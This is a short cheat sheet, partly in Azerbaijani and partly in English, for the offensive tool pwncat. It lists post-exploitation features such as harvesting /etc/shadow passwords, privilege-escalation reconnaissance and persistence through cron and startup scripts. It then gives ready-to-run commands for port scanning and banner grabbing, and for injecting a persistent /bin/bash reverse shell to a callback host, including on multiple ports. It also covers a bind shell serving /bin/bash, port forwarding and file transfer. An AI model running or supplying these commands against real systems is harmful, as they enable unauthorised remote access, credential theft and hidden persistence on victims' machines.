# PwnCat

`pwncat` – interaktiv bir shell-ə qoşulmaq və bu shell-i inkişaf etmiş funksiya ilə təmin etmək üçün istifadə olunur. netcat-in (nc) inkişaf etmiş alternativi kimi düşünə bilərsən, amma ondan daha çox imkanlara malikdir.

### 🎯 Əsas məqsədləri və istifadə sahələri:  
- ✅ Reverse shell meneceri – TCP/UDP bağlantıları ilə gələn shell-ləri qəbul edir və interaktiv idarə edir.  
- ✅ Post-exploitation funksiyalar:  
  - Parolları tapmaq və saxlamaq (məs. /etc/shadow)  
  - Cron işlərini tapmaq  
  - SUID/SGID faylları analiz etmək  
  - Yetkilər və imkanlar haqqında məlumat toplamaq (privilege escalation üçün)  
- ✅ Persistence (davamlılıq) təmin etmək – sistemdə qaldığını təmin etmək üçün avtomatik yollar təklif edir (startup script, cron job və s.).
- ✅ Fayl transferi – sadə komanda ilə fayl yükləmək və endirmək mümkündür.
- ✅ Canlı sistem məlumatı – sistem haqqında detallı məlumat verir: istifadəçilər, portlar, proseslər və s.
- ✅ History və logging – bütün əməliyyatlar qeyd olunur.



### Port scanning and Banner grabbing
`pwncat -z 192.168.1.23 1-100`  
`pwncat -z 192.168.1.23 1-100 --banner`

PS: Pwncat not only performs port scanning on TCP ports it can also scan UDP ports just by using a -u flag in the above command.

### As a Listener

`pwncat -l 1234 --self-inject /bin/bash:192.168.1.7:1234`

The persistence can be checked by running a rlwrap listener at the same port after terminating the above connection  
`rlwrap nc -lvnp 1234`

Pwncat has a feature to create persistence on multiple ports which can be performed using the following command:  
`pwncat -l 1234 --self-inject /bin/bash:192.168.1.7:1234+2`

### Local Port Forwarding
`pwncat -L 0.0.0.0:5000 127.0.0.1 8080`

### Send and Receive Files
`pwncat -l 6666 > data.txt`  
`pwncat 192.168.1.7 6666 < data.txt`

### Bind Shell (Linux)
`pwncat 192.168.1.23 9874`  
`pwncat -l -e '/bin/bash ' 9874 -k`


